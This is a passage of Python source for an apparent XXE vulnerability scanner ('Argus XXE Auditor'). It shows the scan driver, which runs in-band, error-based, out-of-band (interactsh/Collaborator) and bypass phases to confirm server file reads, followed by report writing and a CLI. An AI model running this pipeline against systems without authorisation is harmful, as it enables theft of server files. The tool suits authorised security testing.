    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PUBLIC ENTRY POINT
# ═════════════════════════════════════════════════════════════════════════════

def run_xxe_scan(
    urls_file: Path,
    outdir: Path,
    *,
    oob_domain: Optional[str] = None,
    use_interactsh: bool = False,
    headers: Optional[dict] = None,
    test_error_based: bool = True,
    test_oob: bool = True,
    test_bypass: bool = True,
    max_surfaces: int = MAX_SURFACES,
) -> Path:
    start = time.monotonic()

    urls = _load_urls(urls_file)
    outdir.mkdir(parents=True, exist_ok=True)

    log.info(f"  Input  : {len(urls)} URL(s) from {urls_file.name}")
    if headers:
        log.info("  Auth   : headers supplied")
    log.info("")

    if not urls:
        log.warning("  No URLs to test — writing empty report")
        return _write_empty_report(outdir, urls_file, start)

    oob = OOBCapture(domain=oob_domain, use_interactsh=use_interactsh)
    oob_active = oob.start()

    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT})
    if headers:
        session.headers.update(headers)
    session.verify = False

    # ── Phase 1: surface discovery ──────────────────────────────────────────
    log.info("  Phase 1 — XML surface discovery")
    surfaces = discover_xml_surfaces(session, urls, headers)
    if len(surfaces) > max_surfaces:
        log.warning(f"    Capping at {max_surfaces} surfaces (had {len(surfaces)})")
        surfaces = surfaces[:max_surfaces]

    surface_lines = [
        f"{s.method}\t{s.url}\t{s.param}\t{s.location}\t{s.hint or '-'}\t{s.accepts_xml}"
        for s in surfaces
    ]
    (outdir / "xxe_surface.txt").write_text("\n".join(surface_lines) + "\n")
    log.info(f"    {len(surfaces)} XML-accepting surface(s)")

    if not surfaces:
        log.warning("  No XML surfaces — writing empty report")
        oob.stop()
        return _write_empty_report(outdir, urls_file, start, total_input=len(urls))

    # ── Phases 2–6: per-surface ─────────────────────────────────────────────
    all_findings: list[XXEFinding] = []
    profiles: list[ParserProfile] = []
    results: list[dict] = []

    try:
        for i, surface in enumerate(surfaces, 1):
            log.info("")
            log.info(f"  [{i:>3}/{len(surfaces)}] {surface.method} {surface.url[:65]}  param={surface.param}")

            try:
                # Phase 2
                profile = fingerprint_parser(session, surface, headers)
                profiles.append(profile)
                caps = ",".join(k for k, v in profile.capabilities.items() if v) or "none"
                log.info(f"           parser={profile.family}  caps=[{caps}]")

                # Phase 3
                inband = run_inband(session, surface, profile, headers)
                all_findings.extend(inband)
                if inband:
                    log.info(f"           → inband CONFIRMED ({inband[0].file_read})")
                    results.append({
                        "url": surface.url, "param": surface.param,
                        "profile": profile.to_dict(),
                        "findings": len(inband),
                    })
                    continue

                # Phase 4
                if test_error_based:
                    errors = run_error_based(session, surface, profile, headers)
                    all_findings.extend(errors)
                    if errors:
                        log.info(f"           → error-based CONFIRMED ({errors[0].file_read})")

                # Phase 5
                if test_oob:
                    oob_findings = run_oob(session, surface, profile, oob, headers)
                    all_findings.extend(oob_findings)
                    if oob_findings:
                        log.info(f"           → OOB candidate (token={oob_findings[0].oob_token[:8]}...)")

                # Phase 6
                if test_bypass and not inband:
                    bypass = run_bypass(session, surface, profile, headers)
                    all_findings.extend(bypass)
                    if bypass:
                        log.info(f"           → bypass CONFIRMED ({bypass[0].bypass_used})")

                results.append({
                    "url": surface.url, "param": surface.param,
                    "profile": profile.to_dict(),
                    "findings": len(inband) + len(errors if test_error_based else []) + len(oob_findings if test_oob else []),
                })

            except Exception as e:
                log.warning(f"           → error: {e}")
                results.append({"url": surface.url, "param": surface.param, "error": str(e)})

        # ── OOB correlation ─────────────────────────────────────────────────
        if oob_active and test_oob:
            all_findings = confirm_oob_batch(oob, all_findings)
    finally:
        oob.stop()

    # ── Deduplicate ─────────────────────────────────────────────────────────
    seen: set[tuple] = set()
    deduped: list[XXEFinding] = []
    for f in all_findings:
        key = (f.target, f.param, f.technique, f.details.get("label", ""))
        if key not in seen:
            seen.add(key)
            deduped.append(f)

    SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
    deduped.sort(key=lambda f: (SEV_ORDER.get(f.severity, 4), -f.confidence, f.target))

    # ── Write outputs ───────────────────────────────────────────────────────
    elapsed = time.monotonic() - start
    by_severity: dict[str, int] = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
    by_technique: dict[str, int] = {}
    by_family: dict[str, int] = {}

    for f in deduped:
        by_severity[f.severity] = by_severity.get(f.severity, 0) + 1
        by_technique[f.technique] = by_technique.get(f.technique, 0) + 1
        if f.parser_family:
            by_family[f.parser_family] = by_family.get(f.parser_family, 0) + 1

    candidate_lines = [
        f"{f.target}\t{f.param}\t{f.technique}\t{f.severity}\t{f.confidence}\t{f.parser_family}\t{f.evidence[:140]}"
        for f in deduped
    ]
    (outdir / "xxe_candidates.txt").write_text("\n".join(candidate_lines) + "\n")

    confirmed = [f for f in deduped if f.severity in ("CRITICAL", "HIGH") and f.confidence >= 85]
    (outdir / "xxe_confirmed.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param}\t{f.technique}\t{f.parser_family}\t{f.file_read or f.evidence[:100]}"
            for f in confirmed
        ) + "\n"
    )

    oob_findings = [f for f in deduped if f.technique == "oob"]
    (outdir / "xxe_oob.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param}\t{f.oob_token}\t{f.severity}\t{f.confidence}\t{f.details.get('oob_url', '')}"
            for f in oob_findings
        ) + "\n"
    )

    fp_lines = [f"{p.url}\t{p.family}\t{','.join(k for k, v in p.capabilities.items() if v)}" for p in profiles]
    (outdir / "xxe_fingerprints.txt").write_text("\n".join(fp_lines) + "\n")

    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(elapsed, 2),
        "input_file": str(urls_file),
        "config": {
            "oob_domain":     oob_domain,
            "interactsh":     use_interactsh,
            "error_based":    test_error_based,
            "oob":            test_oob,
            "bypass":         test_bypass,
            "authenticated":  headers is not None,
        },
        "totals": {
            "urls_input":       len(urls),
            "surfaces_tested":  len(surfaces),
            "total_findings":   len(deduped),
            "confirmed":        len(confirmed),
            "oob_findings":     len(oob_findings),
            "critical":         by_severity["CRITICAL"],
            "high":             by_severity["HIGH"],
            "medium":           by_severity["MEDIUM"],
            "low":              by_severity["LOW"],
        },
        "summary": {
            "by_severity":  by_severity,
            "by_technique": dict(sorted(by_technique.items(), key=lambda kv: -kv[1])),
            "by_parser":    dict(sorted(by_family.items(), key=lambda kv: -kv[1])),
        },
        "surfaces":   [s.to_dict() for s in surfaces],
        "profiles":   [p.to_dict() for p in profiles],
        "results":    results,
        "findings":   [f.to_dict() for f in deduped],
    }

    json_path = outdir / "xxe_findings.json"
    json_path.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n")

    log.info("")
    log.info("  Outputs :")
    log.info(f"    {json_path.name:<28} {len(deduped):>5} finding(s)")
    log.info(f"    xxe_candidates.txt           {len(deduped):>5} candidate(s)")
    log.info(f"    xxe_confirmed.txt            {len(confirmed):>5} confirmed")
    log.info(f"    xxe_oob.txt                  {len(oob_findings):>5} OOB finding(s)")
    log.info(f"    xxe_surface.txt              {len(surfaces):>5} surface(s)")
    log.info(f"    xxe_fingerprints.txt         {len(profiles):>5} fingerprint(s)")

    log.info("")
    log.info(
        f"  Severity : CRITICAL={by_severity['CRITICAL']}  "
        f"HIGH={by_severity['HIGH']}  MEDIUM={by_severity['MEDIUM']}  "
        f"LOW={by_severity['LOW']}"
    )
    if by_technique:
        log.info(f"  Technique: " + " · ".join(f"{k}({v})" for k, v in by_technique.items()))
    if by_family:
        log.info(f"  Parser   : " + " · ".join(f"{k}({v})" for k, v in by_family.items()))

    if confirmed:
        log.info("")
        log.info("  Confirmed XXE findings:")
        for f in confirmed[:10]:
            log.info(f"    [{f.severity:<8}] {f.technique:<8} {f.parser_family:<12} {f.param:<12} {f.target[:50]}")

    log.info("")
    log.info(f"  Completed in {elapsed:.1f}s")
    return json_path


def _write_empty_report(
    outdir: Path, input_file: Path, start: float, total_input: int = 0,
) -> Path:
    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(time.monotonic() - start, 2),
        "input_file": str(input_file),
        "config": {},
        "totals": {
            "urls_input": total_input, "surfaces_tested": 0,
            "total_findings": 0, "confirmed": 0, "oob_findings": 0,
            "critical": 0, "high": 0, "medium": 0, "low": 0,
        },
        "summary": {"by_severity": {}, "by_technique": {}, "by_parser": {}},
        "surfaces": [],
        "profiles": [],
        "results": [],
        "findings": [],
    }
    path = outdir / "xxe_findings.json"
    path.write_text(json.dumps(report, indent=2) + "\n")
    for name in ("xxe_candidates.txt", "xxe_confirmed.txt", "xxe_oob.txt",
                 "xxe_surface.txt", "xxe_fingerprints.txt"):
        (outdir / name).write_text("")
    return path


# ═════════════════════════════════════════════════════════════════════════════
#  STANDALONE TEST
# ═════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import argparse

    logging.basicConfig(
        level=logging.INFO,
        format="%(message)s",
        handlers=[logging.StreamHandler(sys.stdout)],
    )
    base = Path(__file__).resolve().parent.parent
    default_input = base / "output" / "urls_with_params.txt"
    if not default_input.exists():
        default_input = base / "output" / "all_urls.txt"
    out = base / "output"

    parser = argparse.ArgumentParser(description="Argus XXE Auditor (standalone)")
    parser.add_argument("--input", type=Path, default=default_input)
    parser.add_argument("--output", type=Path, default=out)
    parser.add_argument("--cookie", help="Session cookie")
    parser.add_argument("--oob-domain", help="OOB domain (Burp Collaborator / interactsh)")
    parser.add_argument("--interactsh", action="store_true", help="Spawn interactsh-client")
    parser.add_argument("--no-error", action="store_true")
    parser.add_argument("--no-oob", action="store_true")
    parser.add_argument("--no-bypass", action="store_true")
    parser.add_argument("--max-surfaces", type=int, default=MAX_SURFACES)
    args = parser.parse_args()

    headers = {"Cookie": args.cookie} if args.cookie else None

    try:
        run_xxe_scan(
            args.input, args.output,
            oob_domain=args.oob_domain,
            use_interactsh=args.interactsh,
            headers=headers,
            test_error_based=not args.no_error,
            test_oob=not args.no_oob,
            test_bypass=not args.no_bypass,
            max_surfaces=args.max_surfaces,
        )
    except Exception as e:
        log.error(f"failed: {e}")
        sys.exit(1)
